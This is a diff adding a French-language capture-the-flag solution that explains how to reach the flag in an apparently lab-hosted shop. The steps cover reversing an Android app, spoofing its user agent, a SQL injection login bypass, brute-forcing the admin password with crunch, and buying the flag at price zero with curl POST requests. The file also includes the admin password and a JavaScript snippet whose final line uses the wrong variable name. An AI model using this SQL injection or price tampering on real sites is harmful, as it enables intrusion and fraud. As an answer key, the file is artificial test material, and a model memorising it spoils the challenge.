@@ -1,0 +1,36 @@
+Ce que vous avez obtenu en reversant l'application android :
+
+- le lien du site
+- le lien de l'ancien site
+- le user agent à utiliser (incluant un token et un numéro de version)
+
+
+Les étapes à suivre :
+
+- désobfusquer le javascript
+- enlever la partie qui vérifie la version d'android et générer l'id envoyé lors de la connexion en hashant le token qui se situe à la fin du user agent (version javascript ci-dessous en HTTPS seulement, ou votre site de hashage préféré)
+- mettre le user agent l'application (attention, le champs version du user agent change selon la version du site, la version est indiquée en commentaire en haut des fichiers html)
+- faire une injection sql sur la page de connexion du vieux site
+- constater que la description du profil de l'admin est un indice sur son mot de passe
+- tester toutes les combinaisons possibles avec crunch et connectez-vous sur le nouveau site
+- constater qu'un item drapeau est en vente, seul bémol, impossible de l'acheter car le module de paiement est en panne
+- constater que, lors d'un achat, le prix est envoyé depuis le javascript, et en déduire-en qu'il n'y a probablement pas de vérification avec la base de données
+- modifier le javascript pour envoyer un prix nul et cliquer sur le bouton d'achat (une fenêtre de téléchargement du drapeau s'ouvre), ou envoyer directement une requête POST avec curl ou tout autre outil
+
+
+Annexes :
+
+- hasher le token en javascript :
+const token_str = navigator.userAgent.slice(-14);
+const token_bytes = new TextEncoder().encode(token_str);
+const token_hash_buffer = await crypto.subtle.digest('SHA-256', token_bytes);
+const token_hash_bytes = Array.from(new Uint8Array(token_hash_buffer));
+const token_hash_str = token_hash_bytes.map(b => b.toString(16).padStart(2, '0')).join('');
+id = user_agent_hash_str;
+
+- acheter produit gratuitement :
+curl -X POST -F 'login=admin' -F 'password=theophile0910' -F 'id=azerty' 192.168.1.10?request=sign_in
+curl -X POST -F 'id=4' -F 'quantity=1' -F 'price=0.0' 192.168.1.10?request=buy_product
+
+- injection SQL :
+1' OR '1' = '1
